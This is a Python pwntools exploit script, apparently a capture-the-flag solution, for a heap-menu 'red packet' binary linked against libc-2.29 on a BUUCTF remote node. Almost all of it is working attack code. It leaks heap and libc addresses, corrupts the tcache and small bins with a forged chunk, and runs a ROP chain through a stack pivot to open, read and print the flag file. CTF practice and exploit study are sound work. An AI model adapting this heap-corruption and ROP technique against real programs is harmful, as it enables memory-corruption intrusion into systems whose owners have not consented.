
'''
huan_attack_pwn
'''

import sys
from pwn import *
# from LibcSearcher import *
# from ctypes import *
context(arch='amd64', os='linux', log_level='debug')
# context(arch='i386' , os='linux', log_level='debug')
binary = './pwn'
libc = './libc-2.29.so'
host, port = "node5.buuoj.cn:26125".split(":")

print(('\033[31;40mremote\033[0m: (y)\n'
    '\033[32;40mprocess\033[0m: (n)'))

if sys.argv[1] == 'y':
    r = remote(host, int(port))
else:
    r = process(binary)

# r = gdb.debug(binary)
# libc = cdll.LoadLibrary(libc)
libc = ELF(libc)
elf = ELF(binary)
# srand = libc.srand(libc.time(0)) #设置种子

default = 1
se      = lambda data                     : r.send(data)
sa      = lambda delim, data              : r.sendafter(delim, data)
sl      = lambda data                     : r.sendline(data)
sla     = lambda delim, data              : r.sendlineafter(delim, data)
rc      = lambda numb=4096                : r.recv(numb)
rl      = lambda time=default             : r.recvline(timeout=time)
ru      = lambda delims, time=default     : r.recvuntil(delims,timeout=time)
rpu     = lambda delims, time=default     : r.recvuntil(delims,timeout=time,drop=True)
uu32    = lambda data                     : u32(data.ljust(4, b'\0'))
uu64    = lambda data                     : u64(data.ljust(8, b'\0'))
lic     = lambda data                     : uu64(ru(data)[-6:])
padding = lambda length                   : b'Yhuan' * (length // 5) + b'Y' * (length % 5)
lg      = lambda var_name                 : log.success(f"{var_name} ：0x{globals()[var_name]:x}")
prl     = lambda var_name                 : print(len(var_name))
debug   = lambda command=''               : gdb.attach(r,command)
it      = lambda                          : r.interactive()

def meau(idx):
	sla(b'Your input: ',str(idx))

def Add(idx,cz,ct):
	meau(1)
	sla(b'Please input the red packet idx: ',str(idx))
	sla(b'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): ',str(cz))
	sa(b'Please input content: ',ct)

def Del(idx):
	meau(2)
	sla(b'Please input the red packet idx: ',str(idx))

def Edi(idx,ct):
	meau(3)
	sla(b'Please input the red packet idx: ',str(idx))
	sa(b'Please input content: ',ct)

def Sho(idx):
	meau(4)
	sla(b'Please input the red packet idx: ',str(idx))


for i in range(9):
	Add(i,4,b'aaaa')

for i in range(8):
	Del(i)

Sho(6)
heapaddr = u64(rc(6).ljust(8,b'\0')) - 0xd6c0 + 0xb000
Sho(7)
libcaddr = u64(rc(6).ljust(8,b'\0')) - 96 - 0x10 - libc.sym['__malloc_hook']
lg('heapaddr')
lg('libcaddr')
# debug()
# pause()
Del(8)

for i in range(6):
	Add(i,2,b'oooo')
	Del(i)

Add(15,4,b'aaaa')
Add(7,3,b'bbbb') # 防止合併
Del(15)			 # 置入unsortedbin
Add(8,3,b'cccc') # 切割 

Add(16,4,b'aaaa')# 置入0x100的small bin
Add(9,3,b'bbbb')
Del(16)
Add(10,3,b'cccc')
Add(11,3,b'cccc')# 置入0x100的small bin
debug()


pl = padding(0x300) + p64(0) + p64(0x101) + p64(heapaddr - 0xb000 + 0xe7e0) + p64(heapaddr + 0x250 + 0x800)
Edi(16,pl)
Add(14,2,b'oooo')

lvr = libcaddr + 0x0000000000058373
rdi = libcaddr + 0x0000000000026542
rsi = libcaddr + 0x0000000000026f9e
rdx = libcaddr + 0x000000000012bda6
open_addr = libcaddr + libc.sym['open']
read_addr = libcaddr + libc.sym['read']
writ_addr = libcaddr + libc.sym['write']
flag_addr = heapaddr - 0xb000 + 0xf630

pay = flat([b'./flag\x00\x00',
    rdi, p64(flag_addr), rsi, 0, open_addr,
    rdi, 3, rsi, p64(flag_addr+200), rdx, 0x40, read_addr,
    rdi, 1, rsi, p64(flag_addr+200), rdx, 0x40, writ_addr
])
Add(13,3,pay)

pay2 = padding(0x80) + p64(flag_addr) + p64(lvr)
meau(666)
sa(b'What do you want to say?',pay2)

it()